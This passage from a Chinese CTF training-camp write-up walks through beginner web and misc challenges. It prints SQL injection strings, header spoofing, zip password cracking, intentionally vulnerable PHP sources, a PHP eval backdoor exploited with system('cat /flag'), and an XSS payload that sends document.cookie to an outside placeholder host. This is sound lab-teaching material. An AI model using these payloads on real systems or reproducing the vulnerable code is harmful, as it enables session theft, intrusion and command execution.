class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">movePlayer</span>(<span class="params">_0x2fa2ec, _0x1d96bc</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> _0x4c26cf = _0x2e725b,</span><br><span class="line">_0x45acd1 = <span class="title class_">Math</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x177</span>)](_0x1d96bc / cellSize),</span><br><span class="line">_0x118e43 = <span class="title class_">Math</span>[<span class="string">&#x27;floor&#x27;</span>](_0x2fa2ec / cellSize);</span><br><span class="line"> (<span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x16e</span>) + flag), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就直接弹出flag了</p><p><strong>解法四</strong>：</p><p>​最开始我以为要拖动红点然后鼠标放红点上，后面按两下回车把撞墙的弹窗关了，flag就弹出来了</p><h3 id="3-easy-PDD"><a href="#3-easy-PDD" class="headerlink" title="3.easy_PDD"></a>3.easy_PDD</h3><blockquote><p>题目开始提示：<strong>一种基于ip的检测技术</strong></p></blockquote><p>盲猜就是发送请求头<strong>X-Forwarded-For</strong>（xxf）后跟不同的地址。bp，启动！！！</p><p>添加入请求头</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:233.233.233.233</span><br></pre></td></tr></table></figure><p>四选一个数字设成playroad然后设置playroad类型为数值，设置100个以上的数字即可</p><h3 id="4-HTTP-Challenge"><a href="#4-HTTP-Challenge" class="headerlink" title="4.HTTP_Challenge"></a>4.HTTP_Challenge</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">this is GET method,</span><br><span class="line">your mission:</span><br><span class="line"></span><br><span class="line">1.I need a GET param &quot;ROIS&quot; valued 405</span><br><span class="line">2.I need a POST param &quot;Vegetables&quot; valued &quot;Potato&quot;</span><br><span class="line">3.Please use admin character</span><br><span class="line">4.request from 127.0.0.1</span><br><span class="line">5.use browser &#x27;ROISBrowser&#x27;</span><br><span class="line">Complete All Missions, and I&#x27;ll give you the FLAG!!!</span><br></pre></td></tr></table></figure><p>根据题目要求</p><ul><li>1.get传参变量ROIS&#x3D;405，方式就是直接在url后加?ROIS&#x3D;405</li><li>2.POST传参变量Vegetables&#x3D;Potato</li><li>3.<code>Please use admin character</code>,使用hackbar抓包发送一次请求后再次抓包，发现cookie中存在这一变量，<code>character=guest</code>，直接把guest改成admin即可</li><li>4.<code>request from 127.0.0.1</code>与easy_PDD这一题一样的trick，设置<code>X-Forwarded-For:127.0.0.1</code></li><li>5.use browser ‘ROISBrowser’<del>（打开rois官网下载ROIS浏览器）</del>，设置<code>useragent:ROISBrowse</code></li></ul><h2 id="Web作业"><a href="#Web作业" class="headerlink" title="Web作业"></a>Web作业</h2><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>刚进来看到这个页面</p><p><img src="/./rois-2024-winter-camp/65b8f2fb3adb2.png" alt="image-20240130210031334"></p><p>然后一顿乱尝试，最后打开源码看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​<code>style</code>属性将边框和光标变化去除，<code>onclick</code>导致无法点击这个链接，在页面看起来和其他无差异</p><p>然后拼接url进入下一个页面</p><blockquote><p>页面提示：It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a>‘</p></blockquote><p>添加请求头：<code>Referer:https://Sycsecret.buuoj.cn</code></p><blockquote><p>页面提示：Please use “Syclover” browser</p></blockquote><p>修改user-agent请求头：<code>User-Agent:Syclover</code></p><blockquote><p>页面提示：No!!! you can only read this locally!!!</p></blockquote><p>locally大概率就是通过ip进行检测，添加请求头：<code>X-Forwarded-For:127.0.0.1</code></p><p>最后成功拿到flag：<code>flag&#123;5d07ecd7-a0b7-4aa3-a3f7-fb7ec9afa6cb&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="easy-password-zip"><a href="#easy-password-zip" class="headerlink" title="easy_password_zip"></a>easy_password_zip</h3><blockquote><p>听说太简单的密码会被爆破，尊嘟假嘟o.O</p></blockquote><p>​根据题目提示，直接拿到kali里面爆破<del>（不得不说就给2核，kali跑的真的慢）</del></p><p><em>John是一款Kali linux自带的密码破解工具，支持密码本破解。John基于密码本破解</em></p><p>输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip2john flag.zip &gt; flag .txt </span><br><span class="line"></span><br><span class="line">john flag.txt  </span><br></pre></td></tr></table></figure><p>跑了很久之后，获得密码：passw</p><h3 id="pseudo-encryption-zip"><a href="#pseudo-encryption-zip" class="headerlink" title="pseudo_encryption_zip"></a>pseudo_encryption_zip</h3><blockquote><p>土豆非常热爱爆破，小涂决定做一道永远不可能爆出密码的。</p></blockquote><p>​根据题目提示，zip被修改二进制数据后实现伪加密<del>（发现MISC题目的hint全在题目上哈哈哈哈哈哈哈哈哈哈）</del></p><p>zip伪加密是在<strong>文件头的加密标志位做修改</strong>，进而再打开文件时识被别为加密压缩包。</p><p>做这题时候的参考文章：</p><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/99851686">CTF——MISC——zip伪加密总结_zip伪加密实验总结-CSDN博客</a></p><p><img src="/./rois-2024-winter-camp/65ba2fe5d0101.png" alt="1706700750476"></p><p>找到全局方式位标记（有无加密）发现都被改成了<code>01 00</code>修改成<code>00 00</code>再次打开压缩包就发现flag.txt没有被加密,打开即可获得flag</p><h3 id="crc32-easy-zip"><a href="#crc32-easy-zip" class="headerlink" title="crc32_easy_zip"></a>crc32_easy_zip</h3><blockquote><p>到底什么人会把文件拆开再放在一起压缩啊？小涂如是说。</p><p>PS: flag不含花括号。</p></blockquote><p><img src="/./rois-2024-winter-camp/65ba31ac97e6d.png" alt="image-20240131194028247"></p><p>打开发现都是小于12字节的txt文件<del>（最开始以为是铭文碰撞，然后发现不行）</del>，然后再网上一通乱找，发现了对于字节比较少的txt文件可以进行crc32碰撞，最后将这些内容拼接起来就可以拿到答案了</p><h3 id="LSB-png"><a href="#LSB-png" class="headerlink" title="LSB_png"></a>LSB_png</h3><blockquote><p>小涂拿放大镜看瞎了眼，也没找到flag。</p></blockquote><p>一顿搜索找到了工具：Stegsolve</p><ol><li>打开加密图片后，选择Analyse-DataExtract</li><li>Bit Planes 选中Reg、Green、Blue的第0位</li><li>然后选择预览</li></ol><p><img src="/./rois-2024-winter-camp/65ba3569520eb.png" alt="1706702138995"></p><p>获得flag</p><h3 id="change-size-png"><a href="#change-size-png" class="headerlink" title="change_size_png"></a>change_size_png</h3><p>把图片拖到kali里面打开，然后发现图片打不开，估计就是图片的长宽高被修改了</p><p>一通梭哈，找到了个脚本通过crc32反推长宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexStr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b +=struct.pack(<span class="string">&quot;B&quot;</span>,<span class="built_in">int</span>(temp,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">str1=<span class="string">&quot;49484452&quot;</span><span class="comment">#文件头数据块标示IDCH</span></span><br><span class="line">str2=<span class="string">&quot;0806000000&quot;</span></span><br><span class="line">bytes1=hexStr2bytes(str1)</span><br><span class="line">bytes2=hexStr2bytes(str2)</span><br><span class="line">wid,hei = <span class="number">248</span>,<span class="number">248</span><span class="comment">#修改此处的宽高</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&quot;0x72571F5D&quot;</span><span class="comment">#请修改此处crc32的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid,wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei,hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_temp=hexStr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_temp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w),<span class="built_in">hex</span>(h))</span><br></pre></td></tr></table></figure><p>最后运行结果得出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\MISC\图片隐写&gt; python 图片高宽检测.py</span><br><span class="line">0xf8 0x19f</span><br></pre></td></tr></table></figure><p>然后用101editor修改图片的相关参数，就可以得到flag</p><p><img src="/./rois-2024-winter-camp/65ba39bb6f5b1.png" alt="1706703282599"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="SQL注入小测试-easy"><a href="#SQL注入小测试-easy" class="headerlink" title="SQL注入小测试-easy"></a>SQL注入小测试-easy</h3><p>源码（黑盒测试，写题的时候是没有源码的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;easy&quot;</span>, <span class="string">&quot;easy&quot;</span>, <span class="string">&quot;easy&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connect</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于是黑盒测试，先向输入框写入语句，<code>&#39; or 1=1 #</code>判断一下注入，然后就直接弹出来flag了</p><h3 id="SQL注入小测试-normal"><a href="#SQL注入小测试-normal" class="headerlink" title="SQL注入小测试-normal"></a>SQL注入小测试-normal</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;normal&quot;</span>, <span class="string">&quot;normal&quot;</span>, <span class="string">&quot;normal&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connect</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$password</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户名或密码不能为空！&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27;&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户：&quot;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&quot; 欢迎登录！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户: &quot;</span> . <span class="variable">$username</span> . <span class="string">&quot; 不存在或密码错误！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样的是黑盒测试，先向输入框写入语句，<code>&#39; or 1=1 #</code>判断一下注入，发现<strong>无论是在用户名处使用语句还是密码处使用语句</strong>都是可以进行登录的，判断是直接进行sql的语句拼接，同时存在一个<strong>回显点</strong>，后使用联合注入法（文章：<a href="/posts/1145624611/">SQL注入-联合查询(union)注入 | WELLS Blog</a>），从爆数据库再到爆字段再到获得flag（写的比较简陋）</p><h3 id="SQL注入小测试-hard"><a href="#SQL注入小测试-hard" class="headerlink" title="SQL注入小测试-hard"></a>SQL注入小测试-hard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;hard&quot;</span>, <span class="string">&quot;hard&quot;</span>, <span class="string">&quot;hard&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connect</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$password</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户名或密码不能为空！&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;欢迎登录！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户: &quot;</span> . <span class="variable">$username</span> . <span class="string">&quot; 不存在或密码错误！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与之前相同的黑盒测试，写入语句<code>&#39; or 1=1 #</code>判断一下注入，同样发现<strong>无论是在用户名处使用语句还是密码处使用语句</strong>都是可以进行登录的，判断也是直接进行sql的语句拼接</p><p>与之前不同的是不存在<strong>回显点</strong>，后使用布尔忙注法（文章：<a href="/posts/1685515616/">SQL注入-布尔盲注 | WELLS Blog </a>），推荐使用脚本进行，与前面相同的顺序从爆数据库再到爆字段再到爆flag</p><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h3><p>xss入门题目，一通观察源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">report</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">`http://<span class="subst">$&#123;<span class="variable language_">document</span>.location.hostname&#125;</span>:8001/report.html?e=`</span>+<span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#input-textarea&#x27;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">payload</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">let</span> parsed = acorn.<span class="title function_">parse</span>(payload, &#123; <span class="attr">ecmaVersion</span>: <span class="string">&#x27;latest&#x27;</span> &#125;).<span class="property">body</span>;</span><br><span class="line"><span class="title function_">alert</span>(<span class="built_in">eval</span>(payload));</span><br><span class="line">&#125; <span class="keyword">catch</span>(e)&#123; </span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span>+e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="function"><span class="params">_</span>=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">let</span> p = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(p) <span class="title function_">execute</span>(<span class="title function_">atob</span>(p));</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>alert(eval(payload));</code>发现输入的指令最后通过eval执行，并且没有对其进行任何的过滤，题目的flag最后在<code>robot用户</code>的cookie中，直接构造playroad，<code>1+window.open(&#39;http://xxxxxxxxxxxx.com/?$&#123;document.cookie&#125;&#39; )</code>,借助最后<code>webhook.site</code>最后在url可以拿到flag</p><p><img src="/./rois-2024-winter-camp/65d5d56771c2a.png" alt="838d1a28281bcaaa52476e97b0416668"></p><h3 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//你知道php有什么危险函数吗？</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$param</span>;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalTest</span>(<span class="params"><span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] === <span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">    back<span class="title class_">Door</span>::<span class="title function_ invoke__">evalTest</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eval</code> 函数可以动态执行字符串中的 PHP 代码</p><p><code>backDoor::evalTest($_GET[&#39;b&#39;]);</code>调用 <code>backDoor</code> 类的静态方法 <code>evalTest</code>，执行 <code>eval($param);</code>语句，flag文件一般位于根目录</p><p>由此可以构造出playroad：<code>?a=ok&amp;b=system(&#39;cat /flag&#39;);</code>其中的<code>system()</code>函数可以执行系统命令，与此函数类似的还有<code>system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号</code></p><h3 id="ez-rce-plus"><a href="#ez-rce-plus" class="headerlink" title="ez_rce_plus?"></a>ez_rce_plus?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_KEY&#x27;</span>] !== <span 